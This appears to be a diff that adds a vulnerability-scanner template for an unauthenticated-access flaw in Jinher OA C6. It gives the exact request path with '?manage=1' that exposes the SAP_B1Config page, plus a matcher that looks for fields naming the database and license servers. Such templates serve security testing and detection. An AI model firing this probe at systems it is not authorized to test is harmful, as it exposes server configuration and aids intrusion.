@@ -1,0 +1,19 @@
+id: jinher-oa-sap-b1config-unauth
+
+info:
+  name: 金和OA C6 SAP_B1Config 未授权访问
+  author: SleepingBag945
+  severity: high
+
+http:
+  - raw:
+      - |
+        GET /C6/JHsoft.CostEAI/SAP_B1Config.aspx/?manage=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body,"txtLicenseServer","txtDatabaseServer")
